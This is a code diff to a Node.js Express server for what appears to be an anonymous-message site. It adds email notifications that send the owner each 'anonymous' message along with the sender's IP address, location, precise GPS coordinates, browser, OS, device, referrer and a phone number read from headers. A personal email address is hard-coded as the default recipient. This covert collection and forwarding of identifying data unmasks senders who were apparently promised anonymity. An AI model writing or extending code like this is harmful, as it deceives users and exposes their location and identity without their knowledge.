@@ -5,6 +5,7 @@ const path = require('path');
 const axios = require('axios');
 const crypto = require('crypto');
 const UAParser = require('ua-parser-js');
+const nodemailer = require('nodemailer');
 
 const app = express();
 const PORT = 3000;
@@ -17,6 +18,27 @@ app.use(cors());
 app.use(express.json());
 
 const MESSAGES_FILE = path.join(__dirname, 'messages.json');
+
+// Email configuration (set via environment variables in deployment)
+// Required for SMTP: SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS
+// Optional: FROM_EMAIL (defaults to SMTP_USER), TO_EMAIL (defaults to provided owner email)
+const EMAIL_TO_DEFAULT = 'isumuthsara2003@gmail.com';
+let mailTransporter = null;
+try {
+  const { SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS } = process.env;
+  if (SMTP_HOST && SMTP_PORT && SMTP_USER && SMTP_PASS) {
+    mailTransporter = nodemailer.createTransport({
+      host: SMTP_HOST,
+      port: Number(SMTP_PORT),
+      secure: Number(SMTP_PORT) === 465,
+      auth: { user: SMTP_USER, pass: SMTP_PASS }
+    });
+  } else {
+    console.log('Email not configured: set SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS.');
+  }
+} catch (e) {
+  console.log('Email transporter setup failed:', e.message);
+}
 
 // In-memory state store for OAuth flow (stateless deployments will reset on restart)
 const oauthStateStore = new Map();
@@ -157,6 +179,43 @@ app.post('/message', async (req, res) => {
     messages.push(newMessage);
     
     await fs.writeFile(MESSAGES_FILE, JSON.stringify(messages, null, 2));
+
+    // Send email notification (non-blocking; errors won't affect response)
+    (async () => {
+      if (!mailTransporter) return;
+      const fromEmail = process.env.FROM_EMAIL || process.env.SMTP_USER || 'no-reply@example.com';
+      const toEmail = process.env.TO_EMAIL || EMAIL_TO_DEFAULT;
+
+      const subject = `New Anonymous Message (#${newMessage.id})`;
+      const coord = newMessage.coordinates || {};
+      const ua = newMessage.userAgent || {};
+      const bodyText = [
+        `Message: ${newMessage.message}`,
+        `Timestamp (UTC): ${newMessage.timestamp}`,
+        `IP: ${newMessage.ip}`,
+        `Location: ${newMessage.location}`,
+        `Coordinates: ${coord.latitude ?? 'N/A'}, ${coord.longitude ?? 'N/A'} (±${coord.accuracy ?? 'N/A'}m)`,
+        `Browser: ${ua.browser} ${ua.browserVersion}`,
+        `OS: ${ua.os} ${ua.osVersion}`,
+        `Device: ${ua.deviceType}`,
+        `Referrer: ${newMessage.referrer}`,
+        `Language: ${newMessage.language}`,
+        newMessage.phone ? `Phone (header): ${newMessage.phone}` : null
+      ].filter(Boolean).join('\n');
+
+      try {
+        await mailTransporter.sendMail({
+          from: fromEmail,
+          to: toEmail,
+          subject,
+          text: bodyText
+        });
+        console.log('Email notification sent to', toEmail);
+      } catch (err) {
+        console.error('Failed to send email notification:', err.message);
+      }
+    })();
+
     res.status(201).json(newMessage);
   } catch (error) {
     res.status(500).json({ error: 'Failed to save message' });
